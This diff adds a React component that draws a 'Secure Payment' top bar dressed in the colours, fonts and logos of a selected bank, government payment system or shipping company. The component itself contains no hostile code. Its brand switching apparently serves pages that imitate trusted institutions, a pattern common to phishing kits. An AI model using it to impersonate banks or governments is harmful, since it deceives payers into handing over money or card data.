@@ -1,0 +1,123 @@
+import React from 'react';
+import { ArrowLeft } from 'lucide-react';
+import { useNavigate } from 'react-router-dom';
+import { getServiceBranding } from '@/lib/serviceLogos';
+import { shippingCompanyBranding, bankBranding } from '@/lib/brandingSystem';
+import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
+
+interface BrandedTopBarProps {
+  serviceKey: string;
+  serviceName: string;
+  showBackButton?: boolean;
+  backPath?: string;
+  bankId?: string;
+  countryCode?: string;
+}
+
+const BrandedTopBar: React.FC<BrandedTopBarProps> = ({
+  serviceKey,
+  serviceName,
+  showBackButton = true,
+  backPath,
+  bankId,
+  countryCode
+}) => {
+  const navigate = useNavigate();
+  const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  const selectedBankBranding = bankId ? bankBranding[bankId] : null;
+  const govSystem = countryCode ? getGovernmentPaymentSystem(countryCode) : null;
+
+  // Priority: Bank branding > Government system > Company branding
+  const activeBranding = selectedBankBranding || (serviceKey === 'payment' && govSystem ? {
+    colors: govSystem.colors,
+    fonts: { arabic: govSystem.fonts.primaryAr, primary: govSystem.fonts.primary, secondary: govSystem.fonts.secondary },
+    gradients: govSystem.gradients,
+    shadows: govSystem.shadows,
+    borderRadius: govSystem.borderRadius
+  } : companyBranding);
+  
+  const primaryColor = activeBranding?.colors.primary || branding.colors.primary;
+  const secondaryColor = activeBranding?.colors.secondary || branding.colors.secondary;
+  const gradient = activeBranding?.gradients?.primary || `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`;
+
+  const handleBack = () => {
+    if (backPath) {
+      navigate(backPath);
+    } else {
+      navigate(-1);
+    }
+  };
+
+  return (
+    <div 
+      className="sticky top-0 z-50 w-full shadow-md"
+      style={{
+        background: gradient,
+        borderBottom: `3px solid ${primaryColor}`
+      }}
+    >
+      <div className="container mx-auto px-4">
+        <div className="flex items-center justify-between h-16 sm:h-20">
+          {/* Right side - Logo */}
+          <div className="flex items-center gap-3 sm:gap-4">
+            {/* Display government logo if available, otherwise company logo */}
+            {((govSystem?.logo && serviceKey === 'payment') || branding.logo) && (
+              <div 
+                className="bg-white rounded-lg sm:rounded-xl p-2 sm:p-3 shadow-lg"
+                style={{
+                  borderRadius: activeBranding?.borderRadius?.md || '10px',
+                  boxShadow: activeBranding?.shadows?.md || `0 4px 6px -1px ${primaryColor}40`
+                }}
+              >
+                <img 
+                  src={(govSystem?.logo && serviceKey === 'payment') ? govSystem.logo : branding.logo} 
+                  alt={serviceName}
+                  className="h-8 sm:h-12 w-auto object-contain"
+                  style={{ maxWidth: '150px' }}
+                  onError={(e) => e.currentTarget.style.display = 'none'}
+                />
+              </div>
+            )}
+            <div className="text-white hidden sm:block">
+              <h2 
+                className="text-lg sm:text-xl font-bold leading-tight"
+                style={{ fontFamily: activeBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
+              >
+                {serviceName}
+              </h2>
+              <p 
+                className="text-xs opacity-90"
+                style={{ fontFamily: activeBranding?.fonts.primary || 'Arial, sans-serif' }}
+              >
+                Secure Payment
+              </p>
+            </div>
+          </div>
+
+          {/* Left side - Back button */}
+          {showBackButton && (
+            <button
+              onClick={handleBack}
+              className="flex items-center gap-2 text-white hover:bg-white/10 px-3 sm:px-4 py-2 rounded-lg transition-all"
+              style={{ fontFamily: activeBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
+            >
+              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5" />
+              <span className="text-sm sm:text-base font-medium">رجوع</span>
+            </button>
+          )}
+        </div>
+      </div>
+
+      {/* Optional bottom gradient line for depth */}
+      <div 
+        className="h-1 w-full"
+        style={{
+          background: `linear-gradient(90deg, ${primaryColor}, ${secondaryColor}, ${primaryColor})`
+        }}
+      />
+    </div>
+  );
+};
+
+export default BrandedTopBar;
